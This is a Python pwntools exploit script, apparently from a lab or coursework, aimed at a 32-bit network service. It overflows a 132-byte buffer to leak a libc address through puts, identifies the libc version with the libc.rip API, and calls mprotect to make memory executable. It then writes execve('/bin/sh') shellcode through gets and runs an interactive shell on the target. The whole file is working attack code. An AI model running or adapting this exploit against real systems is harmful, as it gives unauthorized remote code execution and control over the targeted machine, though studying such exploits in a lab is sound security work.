import requests
import json
from pwn import remote, u32, p32, p64, log, flat, process
import argparse

remoteIp = '192.168.0.156'
remotePort = 9000
conn = remoteIp
port = remotePort
arch = 4
BUFF_SIZE = 132

PLT_PUTS = 0x8048340
pltGets = 0x08048330
MAIN_ADDR = 0x804847b
gotPuts = 0x80497ac
gotGets = 0x80497a8

OUTPUT_LINES_BEFORE = 6
OUTPUT_LINES_AFTER = 2

writeToStack = False
leakNo = 30
leakDelim = b"Welcome"
shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
redirectStdErr = True

HEADERS = {'Content-Type': 'application/json'}
# (Baumstark, 2020)
FIND_LIBC_URL = 'https://libc.rip/api/find'
libcSearchUrl = "https://libc.rip/api/libc/"

def leak_via_puts(conn, port,puts_got_addr):
    """
    Leaks randomised libc address via puts' PLT and function's GOT.
    """
    global proc
    proc = remote(conn,port)
    payload = b'A' * BUFF_SIZE + p32(PLT_PUTS) + p32(MAIN_ADDR) + p32(puts_got_addr)
    proc.sendline(payload)
    skip_lines(proc, OUTPUT_LINES_BEFORE)
    puts_addr = u32(proc.recv(4))
    skip_lines(proc, OUTPUT_LINES_AFTER)
    log.success(f"Leaked address of puts: {hex(puts_addr)}")
    return puts_addr

def skip_lines(proc, lines):
    for _ in range(lines):
        proc.recvline(timeout=0.05)

def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff):
    # Leak randomised libc puts addr
    putsAddr = leak_via_puts(conn, port, gotPuts)

    # Get lib base addr using putsOffset
    libc_address = putsAddr - putsOffset
    log.success(f'LIBC base: {hex(libc_address)}')
    
    
    codeAddr = libc_address
    
    # Execute mprotect(&codeaddr, 0x21000, PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4)) 
    # This allows the program to write to and execute the address found above
    #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
    payload = flat(
        b'C' * BUFF_SIZE,                # Padding so the next bytes will overwrite the EIP
        p32(mprotectOff+libc_address),  # Overflowed function will execute mprotect() on return
        MAIN_ADDR,                       # mprotect will execute main() on return to facilitate subsequent buffer overflows
        p32(codeAddr>>0xc<<0xc),        # mprotect's first pararmter, the start address where the memory protections are changed
                                        # Being the code address gained above with the last 3 bytes set to 0x00
        p32(0x21000),                   # mprotect's second pararmter, the number of bytes after that address to change protections on
                                        # With 0x21000 being sufficiently large as to make sure any shellcode can be executed
        p32(0x7)                        # mprotect's third pararmter, the protection value to change on those addresses
                                        # Which is Read-Write-Execute: PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4) = 0x7
    )
    proc.sendline(payload)
    log.success(f"Changed protections for {hex(codeAddr>>0xc<<0xc)}-{hex((codeAddr>>0xc<<0xc)+0x21000)} to RWX with mprotect")

    # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
    # Then execute that shellcode upon return of that gets()
    payload = flat(
        b'D' * BUFF_SIZE, # Padding so the next bytes will overwrite the EIP
        pltGets,         # Overflowed function will execute gets() on return
        codeAddr,        # gets will execute shellcode on return. This is the payload execution
        codeAddr         # The input to gets will be written to the address found above
    )
    proc.sendline(payload)
    log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")

    # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
    payload = flat(
        b'\x90'*20,
        shellcode
    )
    proc.sendline(payload)
    log.success(f"Sent shellcode to {hex(codeAddr)} via gets")

    # Recieve output of previous overflows to clear stdout
    output = b""
    while True:
        try:
            currline = proc.recv(timeout = 0.2)
            if len(currline)==0:
                break
            output+=currline
        except:
            break
    #print(output)
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handle_reverse_shell()

def handle_reverse_shell():
    """
    Handles the reverse shell interaction with the process.
    """
    try:
        proc.sendline(b"whoami")
        print(proc.recv(timeout=0.1).decode('utf-8'))
        while True:
            command = input("$ ")
            proc.sendline(command.encode('utf-8'))
            print(proc.recv(timeout=0.2).decode('utf-8'))
    except EOFError:
        return 300


def find_potential_libcs(puts_addr):
    """
    Retrieves potential libc versions matching given offsets.
    """
    data = {"symbols": {"puts": hex(puts_addr)}}
    response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
    return response.json()

def getLibcSymbolOffsets(libcJson):
    # Get the libc id to perform a more thorough search of functions
    libId = libcJson['id']
    libcUrl = libcSearchUrl+libId
    
    # Define extra symbols to retrieve from the database
    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}

    # Request symbols from the datatbase
    response = requests.post(libcUrl, headers=HEADERS, data=json.dumps(findSymbols))
    symbolJson = response.json()

    # Store the symbols into variables
    putsOff = symbolJson['symbols'].get('puts')
    systemOff = symbolJson['symbols'].get('system')
    exitOff = symbolJson['symbols'].get('exit')
    mprotectOff = symbolJson['symbols'].get('mprotect')
    printfOff = symbolJson['symbols'].get('printf')
    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
    print()
    log.info("Trying offsets for libc version: "+libId)
    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
    return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff


def main():
        putsAddr = leak_via_puts(conn,port,gotPuts)
        responseJson = find_potential_libcs(putsAddr)

        for item in responseJson:
        # Get the symbol offsets for the specific libc version
            putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = getLibcSymbolOffsets(item)
            
            attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16),int(printfOff,16))


if __name__ == "__main__":
    main()